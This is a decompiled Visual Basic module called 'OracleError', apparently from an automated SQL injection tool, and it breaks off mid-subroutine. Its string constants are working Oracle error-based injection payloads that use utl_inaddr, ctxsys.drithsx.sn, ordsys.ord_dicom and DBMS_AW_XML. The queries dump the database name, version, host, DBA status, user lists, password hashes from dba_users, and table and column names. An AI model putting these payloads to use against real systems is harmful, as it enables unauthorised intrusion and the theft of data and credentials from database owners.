Attribute VB_Name = "OracleError"
' This code module rebuilt by VBRezQ v3.3a.  2-Feb-2012 / 19:56:32
Option Explicit 
 
'Sub Subr_715()
'N  * ref: __vbaExceptHandler
'N  * ref: "select chr(126)||chr(39)||name||chr(39)||chr(126) from v$database where rownum=1"
'N  * ref: "%String_Col%"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: "select chr(126)||chr(39)||global_name||chr(39)||chr(126) from global_name where rownum=1"
'N  * ref: "%String_Col%"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "DB Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "Current DB: "
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: __vbaVarCopy
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_716()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarDup
'N  * ref: "or"
'N  * ref: Subr_713
'N  * ref: Subr_714
'N  * ref: __vbaVarCat
'N  * ref: "1=utl_inaddr.get_host_address((%String_Col%))"
'N  * ref: Subr_715
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: "or"
'N  * ref: Subr_713
'N  * ref: Subr_714
'N  * ref: "1=ctxsys.drithsx.sn(1,(%String_Col%))"
'N  * ref: Subr_715
'N  * ref: __vbaVarTstEq
'N  * ref: "||"
'N  * ref: Subr_713
'N  * ref: Subr_714
'N  * ref: "utl_inaddr.get_host_address((%String_Col%))"
'N  * ref: Subr_715
'N  * ref: __vbaVarTstEq
'N  * ref: "or"
'N  * ref: Subr_713
'N  * ref: Subr_714
'N  * ref: "1=ordsys.ord_dicom.getmappingxpath((%String_Col%),user,user)"
'N  * ref: Subr_715
'N  * ref: __vbaVarTstEq
'N  * ref: "or"
'N  * ref: Subr_713
'N  * ref: Subr_714
'N  * ref: "1=SYS.DBMS_AW_XML.READAWMETADATA((%String_Col%),null)"
'N  * ref: Subr_715
'N  * ref: Subr_715
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarDup
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Cannot get current db name!"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_717()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: "(select distinct chr(126)||chr(39)||owner||chr(39)||chr(126) from (select distinct rownum r,owner from all_tables)where r="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Data Base Found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "Data Bases: "
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "(select distinct chr(126)||chr(39)||owner||chr(39)||chr(126) from (select distinct rownum r,owner from all_tables)where r="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Data Base Found: "
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbTab
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_718()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaLenBstr
'N  * ref: "NULL"
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: __vbaI4Var
'N  * ref: "chr("
'N  * ref: Mid(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: ")||"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: Left(
'N  * ref: __vbaStrCat
'N  * ref: "'"
'N  * ref: __vbaStrMove
'N  * ref: "'"
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_719()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "(select chr(126)||chr(39)||sys.login_user||chr(39)||chr(126) from dual)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: Subr_718
'N  * ref: "(select chr(126)||chr(39)||password||chr(39)||chr(126) from dba_users where username="
'N  * ref: ")"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarDup
'N  * ref: ":"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "Current User: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Current User: "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: ":"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCat
'N  * ref: "USERENV"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "ISDBA"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "(select chr(126)||chr(39)||SYS_CONTEXT("
'N  * ref: ", "
'N  * ref: ")||chr(39)||chr(126) from dual)"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Is User DBA: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Is User DBA: "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: "(select chr(126)||chr(39)||banner||chr(39)||chr(126) from v$version where rownum=1)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Sql Version: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Sql Version: "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: Subr_715
'N  * ref: __vbaFreeVar
'N  * ref: "USERENV"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "HOST"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "(select chr(126)||chr(39)||SYS_CONTEXT("
'N  * ref: ", "
'N  * ref: ")||chr(39)||chr(126) from dual)"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Host Name: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Host Name: "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarMove
'N  * ref: "(select distinct chr(126)||chr(39)||username||chr(39)||chr(126) from (select distinct rownum r,username from all_users)where r=1)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: Subr_718
'N  * ref: "(select chr(126)||chr(39)||password||chr(39)||chr(126) from dba_users where username="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarDup
'N  * ref: ":"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "Db user found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "DB User: "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: ":"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCmp
'N  * ref: "(select distinct chr(126)||chr(39)||cast(username as char(50))||chr(39)||chr(126) from (select distinct rownum r,username from all_users)where r="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarTstNe
'N  * ref: Subr_718
'N  * ref: "(select chr(126)||chr(39)||password||chr(39)||chr(126) from dba_users where username="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarDup
'N  * ref: ":"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "Db user found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: ":"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: Subr_717
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_720()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * ref: __vbaOnError
'N  * ref: "owner<>"
'N  * ref: "SYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: " and owner <>"
'N  * ref: "SYSTEM"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: " and owner<>"
'N  * ref: "CTXSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: " and owner<>"
'N  * ref: "WMSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: " and owner<>"
'N  * ref: "MDSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: " and owner<>"
'N  * ref: "OLAPSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "table_name"
'N  * ref: __vbaStrCopy
'N  * ref: "all_tables"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_723
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: "SYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "SYSTEM"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "CTXSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "WMSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "MDSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "OLAPSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "(select distinct chr(126)||chr(39)||cast(table_name as char(50))||chr(39)||chr(126) from (select distinct rownum r,table_name from all_tables where owner<>"
'N  * ref: " and owner <>"
'N  * ref: " and owner<>"
'N  * ref: " and owner<>"
'N  * ref: " and owner<>"
'N  * ref: " and owner<>"
'N  * ref: ")where r="
'N  * ref: ")"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaChkstk
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: __vbaChkstk
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCmp
'N  * ref: "SYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "SYSTEM"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "CTXSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "WMSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "MDSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "OLAPSYS"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_718
'N  * ref: "(select distinct chr(126)||chr(39)||cast(table_name as char(50))||chr(39)||chr(126) from (select distinct rownum r,table_name from all_tables where owner<>"
'N  * ref: " and owner <>"
'N  * ref: " and owner<>"
'N  * ref: " and owner<>"
'N  * ref: " and owner<>"
'N  * ref: " and owner<>"
'N  * ref: ")where r="
'N  * ref: ")"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaChkstk
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: __vbaChkstk
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_721()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "table_name="
'N  * ref: Subr_718
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "column_name"
'N  * ref: __vbaStrCopy
'N  * ref: "all_tab_columns"
'N  * ref: Subr_723
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: Subr_718
'N  * ref: "(select chr(126)||chr(39)||column_name||chr(39)||chr(126) from (select rownum r,column_name from all_tab_columns where table_name="
'N  * ref: ")where r="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: "Column found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCmp
'N  * ref: Subr_718
'N  * ref: "(select chr(126)||chr(39)||column_name||chr(39)||chr(126) from (select rownum r,column_name from all_tab_columns where table_name="
'N  * ref: ")where r="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: "Column found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
